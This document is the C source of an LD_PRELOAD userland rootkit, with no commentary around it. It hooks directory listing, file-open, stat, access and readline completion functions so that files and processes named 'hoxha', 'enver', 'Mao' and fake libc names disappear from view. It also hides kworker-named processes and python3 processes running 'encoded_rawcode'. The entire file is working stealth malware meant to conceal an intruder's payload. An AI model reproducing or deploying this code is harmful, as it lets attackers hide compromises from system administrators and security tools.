#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <stdarg.h>
#include <fcntl.h>
#include <readline/readline.h>
#include <readline/history.h>

#define MAX_HIDDEN 32

// static names to always hide
static const char *STATIC_HIDE_NAMES[] = {
    "Mao",
    "enver",
    "hoxha",
    "libc.so.5",
    "libc.so.4",
    NULL
};

static char *hide_names[MAX_HIDDEN + 1] = { 0 };
static pid_t *hide_pids = NULL;
static size_t hide_pids_count = 0;
static size_t hide_pids_capacity = 0;

// Forward declarations
static int libhide(const char *name);
static int should_hide_pid(pid_t pid);
static void add_hide_name(const char *name);
static void add_hide_pid(pid_t pid);

// Helpers to add names or PIDs to hide
static void add_hide_name(const char *name) {
    for (int i = 0; i < MAX_HIDDEN; ++i) {
        if (!hide_names[i]) {
            hide_names[i] = strdup(name);
            return;
        }
    }
}

static void add_hide_pid(pid_t pid) {
    // Add to hide_pids array
    if (hide_pids_count >= hide_pids_capacity) {
        hide_pids_capacity = hide_pids_capacity ? hide_pids_capacity * 2 : 16;
        pid_t *new_pids = realloc(hide_pids, hide_pids_capacity * sizeof(pid_t));
        if (new_pids) hide_pids = new_pids;
    }
    if (hide_pids) {
        hide_pids[hide_pids_count++] = pid;
    }
    
    // Also add string representation to hide_names for compatibility
    char buf[16];
    snprintf(buf, sizeof(buf), "%d", pid);
    add_hide_name(buf);
}

// Check if a PID should be hidden – first try comm, then stat as fallback
static int should_hide_pid(pid_t pid) {
    if (pid <= 1) return 0;
    
    // Fast path: already in hide_pids
    for (size_t i = 0; i < hide_pids_count; i++) {
        if (hide_pids[i] == pid) return 1;
    }

    char path[64];
    char comm[256];
    int found = 0;

    // Try /proc/pid/comm first (direct syscalls to avoid hooks)
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    int fd = syscall(__NR_open, path, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = syscall(__NR_read, fd, comm, sizeof(comm) - 1);
        syscall(__NR_close, fd);
        if (n > 0) {
            comm[n] = '\0';
            char *newline = strchr(comm, '\n');
            if (newline) *newline = '\0';
            if (strncmp(comm, "kworker/", 8) == 0) {
                found = 1;
            } else if (strcmp(comm, "hoxha") == 0 || strcmp(comm, "enver") == 0) {
                found = 1;
            }
        }
    }

    // If comm didn't work, try stat (some kernels may not have comm for kernel threads?)
    if (!found) {
        snprintf(path, sizeof(path), "/proc/%d/stat", pid);
        fd = syscall(__NR_open, path, O_RDONLY);
        if (fd >= 0) {
            char buf[512];
            ssize_t n = syscall(__NR_read, fd, buf, sizeof(buf) - 1);
            syscall(__NR_close, fd);
            if (n > 0) {
                buf[n] = '\0';
                // Extract name between parentheses
                char *start = strchr(buf, '(');
                char *end = strrchr(buf, ')');
                if (start && end && start < end) {
                    size_t len = end - start - 1;
                    if (len < sizeof(comm)) {
                        strncpy(comm, start + 1, len);
                        comm[len] = '\0';
                        if (strncmp(comm, "kworker/", 8) == 0 ||
                            strcmp(comm, "hoxha") == 0 ||
                            strcmp(comm, "enver") == 0) {
                            found = 1;
                        }
                    }
                }
            }
        }
    }

    if (found) {
        add_hide_pid(pid);
        return 1;
    }
    return 0;
}

// Original libhide checks exact match against hide_names
static int libhide(const char *name) {
    if (!name) return 0;
    
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        if (strcmp(name, hide_names[i]) == 0) return 1;
    }
    
    // Also check if it's a PID string that should be hidden
    if (isdigit(name[0])) {
        char *endptr;
        long pid = strtol(name, &endptr, 10);
        if (*endptr == '\0' && pid > 0) {
            return should_hide_pid((pid_t)pid);
        }
    }
    
    return 0;
}

// ====== READLINE HOOKS ======
static char *(*orig_readline)(const char *) = NULL;
static char **(*orig_rl_completion_matches)(const char *, rl_compentry_func_t *) = NULL;
static char *(*orig_rl_filename_completion_function)(const char *, int) = NULL;

static char *custom_filename_completion_function(const char *text, int state) {
    static DIR *dir = NULL;
    static char *filename = NULL;
    static size_t text_len = 0;
    static char *dirpath_copy = NULL;
    struct dirent *entry;
    char *result = NULL;

    if (!state) {
        if (dir) {
            closedir(dir);
            dir = NULL;
        }
        if (dirpath_copy) {
            free(dirpath_copy);
            dirpath_copy = NULL;
        }
        if (filename) {
            free(filename);
            filename = NULL;
        }
        
        const char *dirpath = ".";
        const char *last_slash = strrchr(text, '/');
        
        if (last_slash) {
            size_t dir_len = last_slash - text + 1;
            dirpath_copy = malloc(dir_len + 1);
            strncpy(dirpath_copy, text, dir_len);
            dirpath_copy[dir_len] = '\0';
            dirpath = dirpath_copy;
            text = last_slash + 1;
        }
        
        dir = opendir(dirpath);
        if (!dir) {
            if (dirpath_copy) {
                free(dirpath_copy);
                dirpath_copy = NULL;
            }
            return NULL;
        }
        
        text_len = strlen(text);
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.' && text[0] != '.') {
            continue;
        }
        
        if (strncmp(entry->d_name, text, text_len) == 0) {
            if (libhide(entry->d_name)) {
                continue;
            }
            
            filename = strdup(entry->d_name);
            break;
        }
    }

    if (filename) {
        if (dirpath_copy) {
            result = malloc(strlen(dirpath_copy) + strlen(filename) + 1);
            strcpy(result, dirpath_copy);
            strcat(result, filename);
        } else {
            result = strdup(filename);
        }
        free(filename);
        filename = NULL;
    } else {
        if (dir) {
            closedir(dir);
            dir = NULL;
        }
        if (dirpath_copy) {
            free(dirpath_copy);
            dirpath_copy = NULL;
        }
    }

    return result;
}

char *rl_filename_completion_function(const char *text, int state) {
    if (!orig_rl_filename_completion_function) {
        *(void **)&orig_rl_filename_completion_function = 
            dlsym(RTLD_NEXT, "rl_filename_completion_function");
    }
    
    char *result = custom_filename_completion_function(text, state);
    if (!result && orig_rl_filename_completion_function) {
        result = orig_rl_filename_completion_function(text, state);
        if (result) {
            const char *basename = strrchr(result, '/');
            basename = basename ? basename + 1 : result;
            if (libhide(basename)) {
                free(result);
                return NULL;
            }
        }
    }
    
    return result;
}

char **rl_completion_matches(const char *text, rl_compentry_func_t *entry_func) {
    if (!orig_rl_completion_matches) {
        *(void **)&orig_rl_completion_matches = 
            dlsym(RTLD_NEXT, "rl_completion_matches");
    }
    
    if (entry_func == rl_filename_completion_function || 
        (orig_rl_filename_completion_function && entry_func == orig_rl_filename_completion_function)) {
        return orig_rl_completion_matches(text, rl_filename_completion_function);
    }
    
    char **matches = orig_rl_completion_matches(text, entry_func);
    if (!matches) return NULL;
    
    int i, j;
    for (i = 0, j = 0; matches[i] != NULL; i++) {
        const char *basename = strrchr(matches[i], '/');
        basename = basename ? basename + 1 : matches[i];
        
        if (!libhide(basename)) {
            matches[j++] = matches[i];
        } else {
            free(matches[i]);
        }
    }
    matches[j] = NULL;
    
    return matches;
}

char *readline(const char *prompt) {
    if (!orig_readline) {
        *(void **)&orig_readline = dlsym(RTLD_NEXT, "readline");
    }
    return orig_readline(prompt);
}

// ====== INITIALISATION ======
__attribute__((constructor))
static void init_hide_names(void) {
    for (int i = 0; STATIC_HIDE_NAMES[i]; ++i) {
        add_hide_name(STATIC_HIDE_NAMES[i]);
    }

    DIR *d = opendir("/proc");
    if (!d) return;

    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_type != DT_DIR || !isdigit(e->d_name[0])) continue;
        pid_t pid = atoi(e->d_name);
        should_hide_pid(pid);  // will add kworker and target PIDs

        // Python3 detection (unchanged)
        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
        FILE *cf = fopen(cmdline_path, "r");
        if (cf) {
            char cmdline[4096];
            size_t len = fread(cmdline, 1, sizeof(cmdline) - 1, cf);
            fclose(cf);
            cmdline[len] = '\0';
            if (strstr(cmdline, "python3") && strstr(cmdline, "encoded_rawcode")) {
                add_hide_pid(pid);
            }
        }
    }
    closedir(d);
}

__attribute__((destructor))
static void cleanup_hide_names(void) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        free(hide_names[i]);
        hide_names[i] = NULL;
    }
    if (hide_pids) {
        free(hide_pids);
        hide_pids = NULL;
    }
    hide_pids_count = 0;
    hide_pids_capacity = 0;
}

// ====== GETDENTS HOOKS ======
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

struct linux_dirent64 {
    uint64_t       d_ino;
    int64_t        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

typedef long (*getdents_func_t)(unsigned int, void *, unsigned int);
typedef long (*getdents64_func_t)(unsigned int, void *, unsigned int);

static getdents_func_t orig_getdents = NULL;
static getdents64_func_t orig_getdents64 = NULL;

static int fd_is_proc(int fd) {
    char path[64], buf[1024];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, buf, sizeof(buf) - 1);
    if (len > 0) {
        buf[len] = '\0';
        return strncmp(buf, "/proc", 5) == 0;
    }
    return 0;
}

long getdents_syscall(unsigned int fd, void *dirp, unsigned int count) {
    if (!orig_getdents) {
        *(void **)&orig_getdents = dlsym(RTLD_NEXT, "getdents");
        if (!orig_getdents) return -ENOSYS;
    }

    long ret = orig_getdents(fd, dirp, count);
    if (ret <= 0) return ret;

    int proc = fd_is_proc(fd);
    struct linux_dirent *d;
    int bpos = 0;
    long new_ret = ret;

    while (bpos < ret) {
        d = (struct linux_dirent *)((char *)dirp + bpos);
        int hide = 0;

        if (proc && isdigit(d->d_name[0])) {
            pid_t pid = atoi(d->d_name);
            if (should_hide_pid(pid)) {
                hide = 1;
            }
        } else if (libhide(d->d_name)) {
            hide = 1;
        }

        if (hide) {
            int next_bpos = bpos + d->d_reclen;
            if (next_bpos < ret) {
                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
            }
            new_ret -= d->d_reclen;
            ret = new_ret;
        } else {
            bpos += d->d_reclen;
        }
    }

    return new_ret;
}

long getdents64_syscall(unsigned int fd, void *dirp, unsigned int count) {
    if (!orig_getdents64) {
        *(void **)&orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
        if (!orig_getdents64) return -ENOSYS;
    }

    long ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;

    int proc = fd_is_proc(fd);
    struct linux_dirent64 *d;
    int bpos = 0;
    long new_ret = ret;

    while (bpos < ret) {
        d = (struct linux_dirent64 *)((char *)dirp + bpos);
        int hide = 0;

        if (proc && isdigit(d->d_name[0])) {
            pid_t pid = atoi(d->d_name);
            if (should_hide_pid(pid)) {
                hide = 1;
            }
        } else if (libhide(d->d_name)) {
            hide = 1;
        }

        if (hide) {
            int next_bpos = bpos + d->d_reclen;
            if (next_bpos < ret) {
                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
            }
            new_ret -= d->d_reclen;
            ret = new_ret;
        } else {
            bpos += d->d_reclen;
        }
    }

    return new_ret;
}

ssize_t getdents(int fd, void *dirp, size_t count) {
    return getdents_syscall(fd, dirp, count);
}

ssize_t getdents64(int fd, void *dirp, size_t count) {
    return getdents64_syscall(fd, dirp, count);
}

// ====== READDIR HOOKS ======
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;

static int dir_is_proc(DIR *dirp) {
    int fd = dirfd(dirp);
    if (fd == -1) return 0;
    char path[64], buf[1024];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, buf, sizeof(buf) - 1);
    if (len > 0) {
        buf[len] = '\0';
        return strncmp(buf, "/proc", 5) == 0;
    }
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        *(void **)&orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            errno = ENOSYS;
            return NULL;
        }
    }

    int proc = dir_is_proc(dirp);
    struct dirent *entry;

    while ((entry = orig_readdir(dirp)) != NULL) {
        int hide = 0;

        if (proc && isdigit(entry->d_name[0])) {
            pid_t pid = atoi(entry->d_name);
            if (should_hide_pid(pid)) {
                hide = 1;
            }
        } else if (libhide(entry->d_name)) {
            hide = 1;
        }

        if (!hide) {
            return entry;
        }
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) {
        *(void **)&orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (!orig_readdir64) {
            errno = ENOSYS;
            return NULL;
        }
    }

    int proc = dir_is_proc(dirp);
    struct dirent64 *entry;

    while ((entry = orig_readdir64(dirp)) != NULL) {
        int hide = 0;

        if (proc && isdigit(entry->d_name[0])) {
            pid_t pid = atoi(entry->d_name);
            if (should_hide_pid(pid)) {
                hide = 1;
            }
        } else if (libhide(entry->d_name)) {
            hide = 1;
        }

        if (!hide) {
            return entry;
        }
    }
    return NULL;
}

// ====== PATH-BASED HOOKS ======
static int should_hide_path(const char *path) {
    if (!path) return 0;
    
    const char *basename = strrchr(path, '/');
    basename = basename ? basename + 1 : path;
    
    if (libhide(basename)) return 1;
    
    if (strstr(path, "/hoxha") || strstr(path, "/enver") ||
        strstr(path, "/libc.so.4") || strstr(path, "/libc.so.5") ||
        strstr(path, "hoxha/") || strstr(path, "enver/")) {
        return 1;
    }
    
    return 0;
}

static int (*orig_access)(const char *, int) = NULL;
int access(const char *path, int mode) {
    if (!orig_access) *(void **)&orig_access = dlsym(RTLD_NEXT, "access");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    return orig_access(path, mode);
}

static DIR *(*orig_opendir)(const char *) = NULL;
DIR *opendir(const char *name) {
    if (!orig_opendir) *(void **)&orig_opendir = dlsym(RTLD_NEXT, "opendir");
    if (should_hide_path(name)) { errno = ENOENT; return NULL; }
    return orig_opendir(name);
}

static FILE *(*orig_fopen)(const char *, const char *) = NULL;
FILE *fopen(const char *path, const char *mode) {
    if (!orig_fopen) *(void **)&orig_fopen = dlsym(RTLD_NEXT, "fopen");
    if (should_hide_path(path)) { errno = ENOENT; return NULL; }
    return orig_fopen(path, mode);
}

static int (*orig_open)(const char *, int, ...) = NULL;
int open(const char *path, int flags, ...) {
    if (!orig_open) *(void **)&orig_open = dlsym(RTLD_NEXT, "open");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    va_list ap; va_start(ap, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(ap, mode_t) : 0;
    va_end(ap);
    return orig_open(path, flags, mode);
}

static int (*orig_open64)(const char *, int, ...) = NULL;
int open64(const char *path, int flags, ...) {
    if (!orig_open64) *(void **)&orig_open64 = dlsym(RTLD_NEXT, "open64");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    va_list ap; va_start(ap, flags);
    mode_t mode = (flags & O_CREAT) ? va_arg(ap, mode_t) : 0;
    va_end(ap);
    return orig_open64(path, flags, mode);
}

static int (*orig_stat)(const char *, struct stat *) = NULL;
int stat(const char *path, struct stat *buf) {
    if (!orig_stat) *(void **)&orig_stat = dlsym(RTLD_NEXT, "stat");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    return orig_stat(path, buf);
}

static int (*orig_lstat)(const char *, struct stat *) = NULL;
int lstat(const char *path, struct stat *buf) {
    if (!orig_lstat) *(void **)&orig_lstat = dlsym(RTLD_NEXT, "lstat");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    return orig_lstat(path, buf);
}

static int (*orig_fstat)(int, struct stat *) = NULL;
int fstat(int fd, struct stat *buf) {
    if (!orig_fstat) *(void **)&orig_fstat = dlsym(RTLD_NEXT, "fstat");
    return orig_fstat(fd, buf);
}

static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
int stat64(const char *path, struct stat64 *buf) {
    if (!orig_stat64) *(void **)&orig_stat64 = dlsym(RTLD_NEXT, "stat64");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    return orig_stat64(path, buf);
}

static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
int lstat64(const char *path, struct stat64 *buf) {
    if (!orig_lstat64) *(void **)&orig_lstat64 = dlsym(RTLD_NEXT, "lstat64");
    if (should_hide_path(path)) { errno = ENOENT; return -1; }
    return orig_lstat64(path, buf);
}

static int (*orig_fstat64)(int, struct stat64 *) = NULL;
int fstat64(int fd, struct stat64 *buf) {
    if (!orig_fstat64) *(void **)&orig_fstat64 = dlsym(RTLD_NEXT, "fstat64");
    return orig_fstat64(fd, buf);
}
